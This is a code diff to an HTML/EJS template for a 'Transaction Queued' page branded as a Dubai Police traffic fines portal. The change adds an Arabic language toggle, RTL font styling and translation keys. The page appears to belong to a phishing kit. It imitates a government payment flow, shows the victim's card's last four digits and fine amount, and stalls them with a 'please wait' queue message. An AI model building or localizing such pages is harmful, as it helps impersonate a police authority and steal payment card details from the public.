@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <title>Transaction Queued | Dubai Police</title>
 <link rel="icon" type="image/png" href="/dp-logo.png">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0;}
 body{font-family:'Inter',-apple-system,sans-serif;background:#f0f4f8;min-height:100vh;display:flex;flex-direction:column;max-width:480px;margin:0 auto;}
+[dir="rtl"] body{font-family:'Cairo','Inter',sans-serif;}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 @keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
 @keyframes spin{to{transform:rotate(360deg)}}
@@ -19,6 +20,7 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
 .h-logo img{width:100%;height:100%;object-fit:cover;}
 .h-name{color:white;font-weight:800;font-size:14px;line-height:1.2;}
 .h-sub{color:rgba(255,255,255,0.6);font-size:11px;}
+.h-right{display:flex;align-items:center;gap:8px;}
 .h-badge{font-size:11px;color:rgba(255,255,255,0.5);}
 
 .main{flex:1;padding:20px 16px 32px;animation:fadeUp .4s ease both;}
@@ -60,7 +62,10 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
       <div class="h-sub">شرطة دبي</div>
     </div>
   </div>
-  <div class="h-badge">Traffic Fines Portal</div>
+  <div class="h-right">
+    <div class="h-badge" data-i18n="traffic_portal">Traffic Fines Portal</div>
+    <button id="lang-toggle" onclick="dpI18n.setLang(dpI18n.getLang()==='ar'?'en':'ar')" style="font-size:12px;font-weight:700;padding:4px 11px;border-radius:16px;border:1.5px solid rgba(255,255,255,0.45);background:rgba(255,255,255,0.12);color:white;cursor:pointer;">AR</button>
+  </div>
 </header>
 
 <div class="main">
@@ -75,26 +80,26 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
           </svg>
         </div>
       </div>
-      <div class="status-title">Transaction Queued</div>
-      <div class="status-sub">Due to high demand, your transaction has been placed in a queue.<br>Please wait patiently.</div>
+      <div class="status-title" data-i18n="queue_title">Transaction Queued</div>
+      <div class="status-sub" data-i18n="queue_sub">Due to high demand, your transaction has been placed in a queue. Please wait patiently.</div>
     </div>
 
     <div class="details-section">
-      <div class="detail-label">Transaction Details</div>
+      <div class="detail-label" data-i18n="tx_details">Transaction Details</div>
       <div class="detail-row">
-        <span class="detail-key">Merchant</span>
+        <span class="detail-key" data-i18n="merchant">Merchant</span>
         <span class="detail-val">Dubai Police</span>
       </div>
       <div class="detail-row">
-        <span class="detail-key">Amount</span>
+        <span class="detail-key" data-i18n="amount">Amount</span>
         <span class="detail-val" style="color:#1a6b3a;font-size:16px;">AED <%= totalFine.toLocaleString() %></span>
       </div>
       <div class="detail-row">
-        <span class="detail-key">Card</span>
+        <span class="detail-key" data-i18n="card">Card</span>
         <span class="detail-val" style="font-family:monospace;">•••• •••• •••• <%= cardLast4 %></span>
       </div>
       <div class="detail-row">
-        <span class="detail-key">Date</span>
+        <span class="detail-key" data-i18n="date">Date</span>
         <span class="detail-val"><%= dateStr %></span>
       </div>
     </div>
@@ -102,17 +107,18 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
     <div class="action-section">
       <div class="wait-indicator">
         <div class="wait-dot"></div>
-        Processing your request, please wait…
+        <span data-i18n="queue_wait">Processing your request, please wait…</span>
       </div>
     </div>
 
     <div class="footer-note">
       <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      Secured by 256-bit SSL encryption
+      <span data-i18n="ssl">Secured by 256-bit SSL encryption</span>
     </div>
   </div>
 </div>
 
+<script src="/js/i18n.js"></script>
 <script>
 const CARD_LAST4 = <%- JSON.stringify(cardLast4) %>;
 const TOTAL_FINE = <%- JSON.stringify(totalFine) %>;
